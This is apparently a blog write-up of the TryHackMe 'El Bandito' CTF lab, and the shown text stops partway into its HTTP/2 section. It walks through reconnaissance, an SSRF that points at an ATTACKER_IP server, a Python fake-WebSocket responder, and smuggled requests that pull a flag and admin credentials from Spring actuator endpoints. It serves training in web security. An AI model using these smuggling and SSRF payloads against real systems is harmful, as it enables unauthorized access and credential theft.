+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>
+<p>As we embark on this new challenge, it becomes clear that the stakes are higher than ever. To succeed, we must infiltrate his network, decode his strategies, and anticipate his moves before he can strike again.</p>
+<p>The mission has evolved: now, we must capture El Bandito. This requires a deep dive into the digital underworld, using cunning and technical skills to outmaneuver him and restore security.</p>
+<p>We request your help in smuggling all the flags.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>Whats the first web flag?</li>
+<li>Whats the second web flag?</li>
+</ol>
+</div>
+<p>The room acts as a final step of HTTP smuggling module, so, explored vulnerabilities are not surprising:</p>
+<ul>
+<li>SSRF</li>
+<li>HTTP request smuggling via fake WebSocket tunnel</li>
+<li>HTTP request smuggling over HTTP 2 with CL.0 technique</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a>
+      <ol>
+        <li><a href="#port-8080">Port 8080</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+      </ol>
+    </li>
+    <li><a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a></li>
+    <li><a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a></li>
+    <li><a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>Port scan revealed two HTTP servers and a printing service (it is not used in this challenge).</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -vv -n -T4 10.10.146.124
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      syn-ack ttl <span style="color:#fab387">61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; pro
+</span></span><span style="display:flex;"><span>tocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  ssl/http syn-ack ttl <span style="color:#fab387">60</span> El Bandito Server
+</span></span><span style="display:flex;"><span>631/tcp  open  ipp      syn-ack ttl <span style="color:#fab387">61</span> CUPS 2.4
+</span></span><span style="display:flex;"><span>8080/tcp open  http     syn-ack ttl <span style="color:#fab387">60</span> nginx
+</span></span></code></pre></div><h3 id="port-8080" >
+  <a href="#port-8080">Port 8080</a>
+</h3>
+<p>On port 8080 there is a landing page for Bandit-Coin. Only two links work: &ldquo;Services&rdquo; and &ldquo;Burn Token&rdquo;.</p>
+<p><figure aria-label="8080 app home page">
+  <img
+    alt="8080 app home page"
+    title="8080 app home page"width="973"height="537"srcset="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_home_hu_5fc487293616cb60.webp 973w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_home_hu_7b4a73bf8d3b039a.webp 420w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_home_hu_370ca6ce12121e40.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_home_hu_1ce2ee5d1a7f9398.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>&ldquo;Services&rdquo; page shows status of related services.</p>
+<p><figure aria-label="Service page showing offline status for websocket service and online status for public service">
+  <img
+    alt="Service page showing offline status for websocket service and online status for public service"
+    title="Service page showing offline status for websocket service and online status for public service"width="811"height="471"srcset="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_services_hu_d4d5c8ecf87d5a59.webp 811w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_services_hu_89c8496e115fd83e.webp 420w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_services_hu_9df2e2e80b995052.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_8080_services_hu_9b6c1f8cf8211f58.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>Status is checked via simple <code>GET</code> requests with service URL as a parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /isOnline?url=http://bandito.public.thm
+</span></span><span style="display:flex;"><span>GET /isOnline?url=http://bandito.websocket.thm
+</span></span></code></pre></div><p>&ldquo;Burn Token&rdquo; page has a feature that doesn&rsquo;t work because it relies on WebSocket service which is currently down. Console shows a message that the service isn&rsquo;t working <em>on purpose</em>.</p>
+<p><figure aria-label="Burn Token page and Console pane with error messages">
+  <img
+    alt="Burn Token page and Console pane with error messages"
+    title="Burn Token page and Console pane with error messages"width="958"height="860"srcset="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_burn_ws_error_hu_689929f228f0a9dd.webp 958w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_burn_ws_error_hu_501b7ee18103c369.webp 420w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_burn_ws_error_hu_c7a5d92d395285ab.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_burn_ws_error_hu_52a3c7855df8879f.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>Directories enumeration with <code>gobuster</code> shows several useful endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>/trace <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/autoconfig <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/metrics <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/home <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/lang <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/pwd <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/beans <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/env/language <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/dump <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 146<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>With these (and rerunning <code>nmap</code> with scripts) I concluded that this web app is running Spring Java framework.</p>
+<h3 id="port-80" >
+  <a href="#port-80">Port 80</a>
+</h3>
+<p>Second service must be accessed via HTTPS only and supports HTTP 2. Main page is linking to a JavaScript file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl -ksi  https://10.10.146.124:80 
+</span></span><span style="display:flex;"><span>HTTP/2 200 
+</span></span><span style="display:flex;"><span>date: Thu, 06 Mar 2025 21:42:47 GMT
+</span></span><span style="display:flex;"><span>content-type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>content-length: 58
+</span></span><span style="display:flex;"><span>content-security-policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>x-content-type-options: nosniff
+</span></span><span style="display:flex;"><span>x-frame-options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>x-xss-protection: 1; mode=block
+</span></span><span style="display:flex;"><span>feature-policy: microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>age: 0
+</span></span><span style="display:flex;"><span>server: El Bandito Server
+</span></span><span style="display:flex;"><span>accept-ranges: bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nothing to see &lt;script src=&#39;/static/messages.js&#39;&gt;&lt;/script&gt;
+</span></span></code></pre></div><p>File <code>messages.js</code> shows chat functionality and two endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#89dceb">document</span>.addEventListener(<span style="color:#a6e3a1">&#34;DOMContentLoaded&#34;</span>, <span style="color:#f38ba8">function</span> () {
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>	<span style="color:#f38ba8">function</span> fetchMessages() {
+</span></span><span style="display:flex;"><span>		fetch(<span style="color:#a6e3a1">&#34;/getMessages&#34;</span>)
+</span></span><span style="display:flex;"><span>			...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6c7086;font-style:italic">// Function to send a message to the server
+</span></span></span><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic"></span>	<span style="color:#f38ba8">function</span> sendMessage() {
+</span></span><span style="display:flex;"><span>		...SNIP...
+</span></span><span style="display:flex;"><span>			fetch(<span style="color:#a6e3a1">&#34;/send_message&#34;</span>, {
+</span></span><span style="display:flex;"><span>				...SNIP...
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	...SNIP...
+</span></span></code></pre></div><p>Going to <code>/getMessages</code> redirects to the login form.</p>
+<p><figure aria-label="Login form">
+  <img
+    alt="Login form"
+    title="Login form"width="678"height="691"srcset="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_80_signin_hu_59e0888bb4820d74.webp 678w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_80_signin_hu_9404d3b624d9754d.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_80_signin_hu_aced88891851d9e4.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<h2 id="establishing-a-fake-websocket-tunnel-via-ssrf" >
+  <a href="#establishing-a-fake-websocket-tunnel-via-ssrf">Establishing a fake WebSocket tunnel via SSRF</a>
+</h2>
+<p>Knowing that the room is about HTTP smuggling, I was confident that I needed to <a href="https://github.com/0ang3el/websocket-smuggle" class="external-link">establish a fake WebSocket tunnel</a>. First, we need to trick the server to think that WebSocket service responds with 101 code. For that, I confirmed SSRF vulnerability in the status check API:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -ksi <span style="color:#a6e3a1">&#39;http://MACHINE_IP:8080/isOnline?url=http://ATTACKER_IP:8000&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#fab387">200</span> 
+</span></span><span style="display:flex;"><span>Server: nginx
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#fab387">06</span> Mar <span style="color:#fab387">2025</span> 21:57:55 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span></code></pre></div><p>Then I wrote a simple python server which responds with 101 code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#94e2d5">from</span> <span style="color:#fab387">http.server</span> <span style="color:#94e2d5">import</span> HTTPServer, BaseHTTPRequestHandler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">class</span> <span style="color:#f9e2af">ExploitHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#cba6f7">def</span> <span style="color:#89b4fa">do_GET</span>(<span style="color:#89dceb">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>log_request()
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">if</span> <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>path <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;/ws&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>protocol_version <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#34;HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>send_response(<span style="color:#fab387">101</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">self</span><span style="color:#89dceb;font-weight:bold">.</span>end_headers()
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;websocket request&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#cba6f7">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#89dceb">print</span>(<span style="color:#a6e3a1">&#34;other&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">def</span> <span style="color:#89b4fa">run_server</span>(port<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">8000</span>):
+</span></span><span style="display:flex;"><span>    server_address <span style="color:#89dceb;font-weight:bold">=</span> (<span style="color:#a6e3a1">&#39;&#39;</span>, port)
+</span></span><span style="display:flex;"><span>    httpd <span style="color:#89dceb;font-weight:bold">=</span> HTTPServer(server_address, ExploitHandler)
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb">print</span>(<span style="color:#f38ba8">f</span><span style="color:#a6e3a1">&#34;Server running on port </span><span style="color:#a6e3a1">{</span>port<span style="color:#a6e3a1">}</span><span style="color:#a6e3a1">&#34;</span>)
+</span></span><span style="display:flex;"><span>    httpd<span style="color:#89dceb;font-weight:bold">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">if</span> <span style="color:#f5e0dc">__name__</span> <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    run_server()
+</span></span></code></pre></div><p>And to confirm successful request smuggling I crafted a request to non-existing page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /toto HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><h2 id="smuggling-http-request-to-get-the-first-flag" >
+  <a href="#smuggling-http-request-to-get-the-first-flag">Smuggling HTTP request to get the first flag</a>
+</h2>
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html" class="external-link">Spring web apps have several interesting endpoints</a>:</p>
+
+<blockquote>
+    <p>Certain Actuator endpoints can expose sensitive data or allow harmful actions:</p>
+<ul>
+<li><code>/dump</code>, <code>/trace</code>, <code>/logfile</code>, <code>/shutdown</code>, <code>/mappings</code>, <code>/env</code>, <code>/actuator/env</code>, <code>/restart</code>, and <code>/heapdump</code>.</li>
+</ul>
+</blockquote>
+<p>Smuggling request to <code>/trace</code> showed that there are two additional endpoints <code>/admin-creds</code> and <code>/admin-flag</code>.</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-0" checked="checked" />
+<label for="tabs-1-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /trace HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-1" id="tabs-1-1"  />
+<label for="tabs-1-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: application/json;charset=UTF-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:10:50 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>13bc
+</span></span><span style="display:flex;"><span>[{&#34;timestamp&#34;:1741381850617,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/isOnline&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;upgrade&#34;:&#34;WebSocket&#34;,&#34;connection&#34;:&#34;Upgrade&#34;,&#34;host&#34;:&#34;localhost:8002&#34;,&#34;sec-websocket-key&#34;:&#34;nf6dB8Pb/BLinZ7UexUXHg==&#34;,&#34;sec-websocket-version&#34;:&#34;13&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:50 GMT&#34;,&#34;status&#34;:&#34;101&#34;}}}},{&#34;timestamp&#34;:1741381841023,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-creds&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;55&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}},{&#34;timestamp&#34;:1741381840973,&#34;info&#34;:{&#34;method&#34;:&#34;GET&#34;,&#34;path&#34;:&#34;/admin-flag&#34;,&#34;headers&#34;:{&#34;request&#34;:{&#34;host&#34;:&#34;0.0.0.0:8081&#34;,&#34;user-agent&#34;:&#34;Wget&#34;,&#34;connection&#34;:&#34;close&#34;},&#34;response&#34;:{&#34;X-Application-Context&#34;:&#34;application:8081&#34;,&#34;Content-Type&#34;:&#34;text/plain&#34;,&#34;Content-Length&#34;:&#34;43&#34;,&#34;Date&#34;:&#34;Fri, 07 Mar 2025 21:10:40 GMT&#34;,&#34;Connection&#34;:&#34;close&#34;,&#34;status&#34;:&#34;200&#34;}}}}, ...SNIP...]
+</span></span><span style="display:flex;"><span>0
+</span></span></code></pre></div></div>
+</div>
+<p>And smuggling request to <code>/admin-flag</code> reveals the first flag:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-0" checked="checked" />
+<label for="tabs-2-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-flag HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-2" id="tabs-2-1"  />
+<label for="tabs-2-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 43
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:16:46 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>THM{:::REDACTED:::}
+</span></span></code></pre></div></div>
+</div>
+<h2 id="http-2-cl0-desync-to-get-the-second-flag" >
+  <a href="#http-2-cl0-desync-to-get-the-second-flag">HTTP 2 CL.0 desync to get the second flag</a>
+</h2>
+<p>Credentials from <code>/admin-creds</code> can be used to login into chat application:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-0" checked="checked" />
+<label for="tabs-3-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/isOnline?url=http://ATTACKER_IP:8000/ws</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Version<span style="color:#89dceb;font-weight:bold">:</span> 13
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#89dceb;font-weight:bold">:</span> WebSocket
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> Upgrade
+</span></span><span style="display:flex;"><span>Sec-WebSocket-Key<span style="color:#89dceb;font-weight:bold">:</span> nf6dB8Pb/BLinZ7UexUXHg==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin-creds HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-3" id="tabs-3-1"  />
+<label for="tabs-3-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">1.1</span> <span style="color:#fab387">101</span> 
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> nginx
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>Connection<span style="color:#89dceb;font-weight:bold">:</span> upgrade
